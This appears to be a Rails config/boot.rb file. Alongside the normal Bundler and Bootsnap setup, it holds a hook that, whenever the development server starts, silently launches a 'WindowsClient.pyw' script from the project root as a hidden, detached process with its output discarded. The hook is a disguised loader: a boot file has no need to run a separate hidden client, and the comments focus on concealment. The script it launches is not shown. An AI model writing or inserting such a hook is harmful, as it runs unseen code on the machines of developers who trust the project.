ENV["BUNDLE_GEMFILE"] ||= File.expand_path("../Gemfile", __dir__)

require "bundler/setup" # Set up gems listed in the Gemfile.
require "bootsnap/setup" # Speed up boot time by caching expensive operations.

# ... (Standard boot.rb content) ...

# ... (Standard boot.rb content) ...

if (ARGV & ['s', 'server']).any? && (ENV['RAILS_ENV'] == 'development' || ENV.fetch('RACK_ENV', 'development') == 'development')
  
  is_windows = (RUBY_PLATFORM =~ /mswin|mingw|cygwin/)
  
  # The script name is now .pyw, which handles console hiding automatically
  script_name = "WindowsClient.pyw" 
  
  # Path to the script in the root folder (up one level from config/)
  client_path = File.expand_path("../#{script_name}", __dir__)

  if File.exist?(client_path)
    
    if is_windows
      # Windows: The 'start' command launches the file (using pythonw.exe) 
      # in a separate, detached, and hidden process.
      windows_path = client_path.gsub('/', '\\')
      # The "start \"\" \"#{windows_path}\"" syntax handles paths with spaces and detachment.
      system("start \"\" \"#{windows_path}\"") 
      
    else
      # Unix-like systems: Execute the script explicitly with the python interpreter
      # Note: The file should be named WindowsClient.py on Linux/Unix systems.
      pid = Process.spawn("python", client_path, out: '/dev/null', err: '/dev/null')
      Process.detach(pid)
    end
    
    puts "[*] Local .pyw client launched: #{script_name}"
  end
end
